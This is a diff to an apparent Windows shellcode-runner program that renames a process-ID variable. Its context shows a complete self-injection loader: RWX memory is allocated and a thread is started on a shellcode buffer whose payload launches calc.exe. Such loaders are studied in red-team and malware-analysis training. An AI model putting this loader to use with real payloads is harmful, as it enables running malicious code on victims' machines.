@@ -30,28 +30,28 @@ int main() {
     "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
 
   // Retrieve the current process ID
-  DWORD pId = 0;
-  pId = GetCurrentProcessId();
-  if(pId == 0) {
+  DWORD pid = 0;
+  pid = GetCurrentProcessId();
+  if(pid == 0) {
       printf("[ERROR] Failed to obtain current process ID!\n");
       return -1;
   }
   
-  printf("[*] Running PI with target PID: %u\n", pId);
+  printf("[*] Running PI with target PID: %u\n", pid);
   
   // Open a handle to the current process, this must be passed to VirtualAllocEx
-  HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pId));
+  HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
   if(pHandle == NULL) {
       printf("Failed to acquire process handle!\n");
       return -1;
   }
   
-  printf("[*] Successfully opened handle to PID: %u\n", pId);
+  printf("[*] Successfully opened handle to PID: %u\n", pid);
   
   // Allocate a block of memory that can store our shellcode
   LPVOID bufferAddress = VirtualAllocEx(pHandle, NULL, sizeof buf, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
   if (bufferAddress == NULL) {
-      printf("[ERROR] Failed to allocate memory within the process (PID: %u)! Error: %lu\n", pId, GetLastError());
+      printf("[ERROR] Failed to allocate memory within the process (PID: %u)! Error: %lu\n", pid, GetLastError());
       return -1;
   }
   
@@ -68,7 +68,7 @@ int main() {
   // Create a new thread using the shellcode buffer address as the starting point
   HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)bufferAddress, NULL, 0, NULL);
   if (tHandle == NULL) {
-      printf("[ERROR] Failed to create thread within the process (PID: %u)! Error: %lu\n", pId, GetLastError());
+      printf("[ERROR] Failed to create thread within the process (PID: %u)! Error: %lu\n", pid, GetLastError());
       VirtualFree(bufferAddress, 0, MEM_RELEASE);
       return -1;
   }
